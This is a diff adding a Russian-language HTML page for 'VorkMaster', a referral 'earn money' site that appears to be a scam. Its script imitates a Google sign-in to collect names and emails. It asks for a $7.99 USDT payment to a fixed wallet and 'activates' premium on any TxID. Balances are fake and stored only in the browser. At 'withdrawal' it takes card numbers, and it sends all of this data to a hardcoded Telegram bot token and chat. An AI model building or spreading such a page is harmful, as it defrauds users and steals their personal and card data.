@@ -2,8 +2,8 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>VorkMaster — зарабатывай с друзьями</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>VorkMaster — Заработок</title>
     <style>
         * {
             margin: 0;
@@ -15,62 +15,53 @@
             background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             color: #fff;
-            line-height: 1.5;
             min-height: 100vh;
+            padding: 20px;
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 500px;
             margin: 0 auto;
-            padding: 1.5rem;
-        }
-
-        /* Header */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 2rem;
         }
 
         .logo {
-            font-size: 1.8rem;
+            text-align: center;
+            font-size: 2rem;
             font-weight: 800;
             background: linear-gradient(135deg, #c084fc, #60a5fa);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
+            margin-bottom: 20px;
         }
 
-        /* Hero */
         .hero {
             text-align: center;
-            padding: 2rem 0;
+            margin: 30px 0;
         }
 
         .hero h1 {
-            font-size: 2.2rem;
-            font-weight: 800;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
             background: linear-gradient(135deg, #fff, #a78bfa);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            margin-bottom: 1rem;
         }
 
         .hero p {
-            font-size: 1rem;
             color: #94a3b8;
-            margin-bottom: 2rem;
+            font-size: 0.95rem;
+            margin-bottom: 30px;
         }
 
-        /* Google Button */
+        /* Кнопка Google */
         .google-btn {
             background: white;
             color: #1e293b;
-            padding: 1rem 2rem;
+            padding: 16px 20px;
             border-radius: 60px;
-            display: inline-flex;
+            display: flex;
             align-items: center;
             justify-content: center;
             gap: 12px;
@@ -81,32 +72,523 @@
             width: 100%;
             max-width: 280px;
             margin: 0 auto;
-            transition: transform 0.2s;
+            transition: 0.2s;
         }
 
         .google-btn:active {
-            transform: scale(0.98);
+            transform: scale(0.97);
         }
 
-        /* Cards */
+        /* Карточки */
         .cards {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 1rem;
-            margin: 2rem 0;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 30px 0;
         }
 
         .card {
             background: rgba(15, 23, 42, 0.7);
-            backdrop-filter: blur(4px);
             border-radius: 24px;
-            padding: 1.5rem;
+            padding: 20px;
             border: 1px solid rgba(139, 92, 246, 0.3);
         }
 
         .card h3 {
             font-size: 1.3rem;
-            margin-bottom: 1rem;
+            margin-bottom: 10px;
         }
 
-        .
+        .price {
+            font-size: 1.5rem;
+            color: #facc15;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .card ul {
+            list-style: none;
+            margin-top: 10px;
+        }
+
+        .card li {
+            margin: 8px 0;
+            font-size: 0.9rem;
+        }
+
+        .premium {
+            border-color: #facc15;
+            background: linear-gradient(135deg, #1e1b3a, #0f172a);
+        }
+
+        /* Модальное окно регистрации */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .reg-form {
+            background: #0f172a;
+            border-radius: 32px;
+            padding: 30px 25px;
+            width: 90%;
+            max-width: 350px;
+            text-align: center;
+            border: 1px solid #8b5cf6;
+        }
+
+        .reg-form h2 {
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+
+        .reg-form input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            background: #1e293b;
+            border: 1px solid #8b5cf6;
+            border-radius: 60px;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .reg-form button {
+            background: linear-gradient(95deg, #8b5cf6, #3b82f6);
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 60px;
+            color: white;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .close-btn {
+            background: none !important;
+            color: #94a3b8 !important;
+            margin-top: 10px;
+        }
+
+        /* Личный кабинет */
+        .dashboard {
+            display: none;
+        }
+
+        .profile-card {
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: 28px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #8b5cf6;
+        }
+
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #334155;
+        }
+
+        .referral-box {
+            background: #1e293b;
+            padding: 12px;
+            border-radius: 20px;
+            margin: 15px 0;
+            display: flex;
+            gap: 10px;
+        }
+
+        .referral-box input {
+            flex: 1;
+            background: #0f172a;
+            border: 1px solid #8b5cf6;
+            color: white;
+            padding: 10px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+        }
+
+        .copy-btn {
+            background: #8b5cf6;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 40px;
+            color: white;
+            cursor: pointer;
+        }
+
+        .withdraw-btn {
+            background: #facc15;
+            color: #0f172a;
+            font-weight: bold;
+            padding: 14px;
+            border-radius: 60px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 15px;
+            font-size: 1rem;
+        }
+
+        .method-block {
+            background: #1e293b;
+            border-radius: 20px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        footer {
+            text-align: center;
+            color: #475569;
+            font-size: 0.7rem;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- ГЛАВНЫЙ ЭКРАН -->
+    <div id="mainScreen">
+        <div class="logo">VORKMASTER</div>
+        
+        <div class="hero">
+            <h1>ЗАВОРКАЙ ЛЕГКО</h1>
+            <h1>ЗАБИРАЙ ДО 500 000₽</h1>
+            <p>Приглашай друзей, выполняй задания, выводи деньги</p>
+            
+            <button class="google-btn" id="openRegBtn">
+                <svg width="20" height="20" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Войти через Google
+            </button>
+        </div>
+
+        <div class="cards">
+            <div class="card">
+                <h3>💸 БЕЗ ПРЕМИУМ</h3>
+                <div class="price">до 50 000₽/мес</div>
+                <ul>
+                    <li>✅ За друга → 1000₽</li>
+                    <li>💰 Вывод от 30 000₽</li>
+                    <li>⚡ Комиссия: 25%</li>
+                </ul>
+            </div>
+            <div class="card premium">
+                <h3>👑 ПРЕМИУМ</h3>
+                <div class="price">до 200 000₽/мес</div>
+                <ul>
+                    <li>✅ За первых 3 друзей → 4000₽</li>
+                    <li>💰 Вывод от 70 000₽</li>
+                    <li>⚡ Комиссия: 20%</li>
+                </ul>
+                <div style="color:#facc15; margin-top:10px;">$7.99 USDT</div>
+            </div>
+        </div>
+        
+        <footer>VorkMaster — твой путь к успеху</footer>
+    </div>
+
+    <!-- ЛИЧНЫЙ КАБИНЕТ -->
+    <div id="dashboard" class="dashboard">
+        <div class="logo">VORKMASTER</div>
+        
+        <div class="profile-card">
+            <div class="stat-row">
+                <span>👤 Имя:</span>
+                <span id="userName">—</span>
+            </div>
+            <div class="stat-row">
+                <span>💰 Баланс:</span>
+                <span id="balance" style="color:#facc15; font-size:1.5rem;">0 ₽</span>
+            </div>
+            <div class="stat-row">
+                <span>👥 Друзей:</span>
+                <span id="referralCount">0</span>
+            </div>
+            <div class="stat-row">
+                <span>🏆 Премиум:</span>
+                <span id="premiumStatus">❌ Нет</span>
+            </div>
+            
+            <div class="referral-box">
+                <input type="text" id="refLink" readonly>
+                <button class="copy-btn" onclick="copyRefLink()">📋</button>
+            </div>
+        </div>
+
+        <div class="method-block">
+            <h3>🔥 КАК ЗАРАБАТЫВАТЬ?</h3>
+            <p>1️⃣ Скопируй ссылку и отправляй друзьям</p>
+            <p>2️⃣ За друга → бонус на баланс</p>
+            <p>3️⃣ Выполняй задания: <a href="https://t.me/vorkmaster_tasks" style="color:#c084fc;">@vorkmaster_tasks</a></p>
+            <p>4️⃣ Накопи сумму → выведи на карту</p>
+        </div>
+
+        <div class="method-block" id="premiumBlock" style="display:none;">
+            <h3>🚀 ПРЕМИУМ МЕТОД</h3>
+            <p>✅ За первых 3 друзей → 4000₽</p>
+            <p>✅ Комиссия вывода: 20%</p>
+        </div>
+
+        <div class="profile-card">
+            <h3>💸 ВЫВОД</h3>
+            <div id="withdrawInfo"></div>
+            <button class="withdraw-btn" id="withdrawBtn">💳 ЗАПРОСИТЬ ВЫВОД</button>
+        </div>
+
+        <button class="withdraw-btn" id="buyPremiumBtn" style="background:#facc15;">💎 КУПИТЬ ПРЕМИУМ — $7.99</button>
+        
+        <footer>VorkMaster</footer>
+    </div>
+</div>
+
+<!-- ФОРМА РЕГИСТРАЦИИ (всплывающее окно) -->
+<div id="regForm" class="overlay">
+    <div class="reg-form">
+        <h2>🔐 Вход через Google</h2>
+        <input type="text" id="regName" placeholder="Имя и фамилия">
+        <input type="email" id="regEmail" placeholder="Email">
+        <button id="submitReg">✅ ЗАРЕГИСТРИРОВАТЬСЯ</button>
+        <button id="closeReg" class="close-btn">Закрыть</button>
+    </div>
+</div>
+
+<!-- ФОРМА ОПЛАТЫ КРИПТОЙ -->
+<div id="cryptoForm" class="overlay">
+    <div class="reg-form">
+        <h2>💎 ОПЛАТА PREMIUM</h2>
+        <p style="margin:10px 0;">$7.99 USDT (ERC20)</p>
+        <div style="background:#1e293b; padding:12px; border-radius:16px; word-break:break-all;">
+            0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908
+        </div>
+        <button id="copyAddrBtn" style="background:#8b5cf6; margin:10px 0;">📋 Копировать адрес</button>
+        <button id="confirmPayBtn">✅ ПОДТВЕРДИТЬ ОПЛАТУ</button>
+        <button id="closeCrypto" class="close-btn">Закрыть</button>
+    </div>
+</div>
+
+<script>
+    // ТВОИ ДАННЫЕ
+    const BOT_TOKEN = "8557565108:AAFnoCGWW0e5Vmrz5vf9ikAKf-MfTm-0AOg";
+    const CHAT_ID = "5314096451";
+    const WALLET = "0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908";
+    
+    let user = null;
+    
+    function sendToTG(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({chat_id: CHAT_ID, text: text})
+        }).catch(e => console.log(e));
+    }
+    
+    function saveUser(data) {
+        localStorage.setItem("vork_user", JSON.stringify(data));
+    }
+    
+    function loadUser() {
+        let data = localStorage.getItem("vork_user");
+        if (data) {
+            user = JSON.parse(data);
+            return true;
+        }
+        return false;
+    }
+    
+    function updateUI() {
+        if (!user) return;
+        document.getElementById("userName").innerText = user.name;
+        document.getElementById("balance").innerText = user.balance + " ₽";
+        document.getElementById("referralCount").innerText = user.refs.length;
+        
+        if (user.premium) {
+            document.getElementById("premiumStatus").innerHTML = "✅ Да (20%)";
+            document.getElementById("premiumBlock").style.display = "block";
+        } else {
+            document.getElementById("premiumStatus").innerHTML = "❌ Нет (25%)";
+            document.getElementById("premiumBlock").style.display = "none";
+        }
+        
+        let minOut = user.premium ? 70000 : 30000;
+        let com = user.premium ? 20 : 25;
+        document.getElementById("withdrawInfo").innerHTML = `
+            <p>Мин. вывод: ${minOut} ₽</p>
+            <p>Комиссия: ${com}%</p>
+            <p>Баланс: ${user.balance} ₽</p>
+            ${user.balance >= minOut ? '<p style="color:#10b981;">✅ Можно вывести</p>' : '<p style="color:#facc15;">⚠️ Копи сумму</p>'}
+        `;
+        
+        let link = document.getElementById("refLink");
+        if (link) link.value = window.location.href.split("?")[0] + "?ref=" + user.id;
+    }
+    
+    function addReferralBonus(refId, newId) {
+        let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
+        let ref = all[refId];
+        if (!ref) return;
+        
+        let bonus = 1000;
+        if (ref.premium && ref.premiumCount < 3) {
+            bonus = 4000;
+            ref.premiumCount++;
+        }
+        
+        ref.balance += bonus;
+        ref.refs.push(newId);
+        all[refId] = ref;
+        localStorage.setItem("vork_all", JSON.stringify(all));
+        
+        if (user && user.id === refId) {
+            user = ref;
+            saveUser(user);
+            updateUI();
+        }
+        
+        sendToTG(`👥 НОВЫЙ РЕФЕРАЛ!\n👤 ${ref.name}\n🎁 Бонус: ${bonus}₽`);
+    }
+    
+    function register(name, email, refId) {
+        let id = "id_" + Date.now() + "_" + Math.random().toString(36).substr(2, 4);
+        let newUser = {
+            id: id, name: name, email: email, balance: 0, refs: [],
+            premium: false, premiumCount: 0
+        };
+        
+        let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
+        all[id] = newUser;
+        localStorage.setItem("vork_all", JSON.stringify(all));
+        
+        if (refId && all[refId]) {
+            addReferralBonus(refId, id);
+        }
+        
+        user = newUser;
+        saveUser(user);
+        
+        sendToTG(`🆕 РЕГИСТРАЦИЯ!\n👤 ${name}\n📧 ${email}\n🆔 ${id}\n${refId ? "🔗 Реферал: " + refId : "Прямая"}`);
+        
+        document.getElementById("mainScreen").style.display = "none";
+        document.getElementById("dashboard").style.display = "block";
+        updateUI();
+    }
+    
+    function activatePremium() {
+        if (!user) return;
+        user.premium = true;
+        saveUser(user);
+        
+        let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
+        if (all[user.id]) all[user.id].premium = true;
+        localStorage.setItem("vork_all", JSON.stringify(all));
+        
+        updateUI();
+        alert("🔥 ПРЕМИУМ АКТИВИРОВАН!");
+    }
+    
+    function withdraw() {
+        if (!user) return;
+        let minOut = user.premium ? 70000 : 30000;
+        let com = user.premium ? 20 : 25;
+        if (user.balance < minOut) {
+            alert(`Нужно накопить ${minOut} ₽`);
+            return;
+        }
+        let amount = user.balance * (1 - com/100);
+        let card = prompt("Номер карты:");
+        if (!card || card.length < 10) return;
+        if (confirm(`Вывести ${amount.toFixed(0)} ₽?`)) {
+            sendToTG(`💸 ВЫВОД!\n👤 ${user.name}\n💰 ${amount.toFixed(0)} ₽\n💳 ${card}`);
+            user.balance = 0;
+            saveUser(user);
+            updateUI();
+            alert("Заявка отправлена!");
+        }
+    }
+    
+    window.copyRefLink = function() {
+        let link = document.getElementById("refLink").value;
+        navigator.clipboard.writeText(link);
+        alert("Ссылка скопирована!");
+    };
+    
+    // ЗАПУСК
+    function start() {
+        let urlRef = new URLSearchParams(window.location.search).get("ref");
+        if (urlRef) localStorage.setItem("pending_ref", urlRef);
+        
+        if (loadUser()) {
+            document.getElementById("mainScreen").style.display = "none";
+            document.getElementById("dashboard").style.display = "block";
+            updateUI();
+        }
+        
+        // Кнопка открывает форму
+        document.getElementById("openRegBtn").onclick = () => {
+            document.getElementById("regForm").style.display = "flex";
+        };
+        
+        document.getElementById("closeReg").onclick = () => {
+            document.getElementById("regForm").style.display = "none";
+        };
+        
+        document.getElementById("submitReg").onclick = () => {
+            let name = document.getElementById("regName").value.trim();
+            let email = document.getElementById("regEmail").value.trim();
+            if (!name) { alert("Введи имя"); return; }
+            if (!email || !email.includes("@")) { alert("Введи email"); return; }
+            let ref = localStorage.getItem("pending_ref");
+            register(name, email, ref);
+            localStorage.removeItem("pending_ref");
+            document.getElementById("regForm").style.display = "none";
+        };
+        
+        document.getElementById("buyPremiumBtn").onclick = () => {
+            if (user && user.premium) { alert("Премиум уже есть"); return; }
+            document.getElementById("cryptoForm").style.display = "flex";
+        };
+        
+        document.getElementById("copyAddrBtn").onclick = () => {
+            navigator.clipboard.writeText(WALLET);
+            alert("Адрес скопирован!");
+        };
+        
+        document.getElementById("confirmPayBtn").onclick = () => {
+            let txid = prompt("Введи TxID:");
+            if (txid && txid.length > 5) {
+                sendToTG(`💎 ПОКУПКА PREMIUM!\n👤 ${user ? user.name : "Гость"}\n💰 $7.99 USDT\n🆔 TxID: ${txid}`);
+                if (user) activatePremium();
+                document.getElementById("cryptoForm").style.display = "none";
+                alert("Премиум активирован!");
+            } else {
+                alert("Введи TxID");
+            }
+        };
+        
+        document.getElementById("closeCrypto").onclick = () => {
+            document.getElementById("cryptoForm").style.display = "none";
+        };
+        
+        document.getElementById("withdrawBtn").onclick = withdraw;
+    }
+    
+    start();
+</script>
+</body>
+</html>
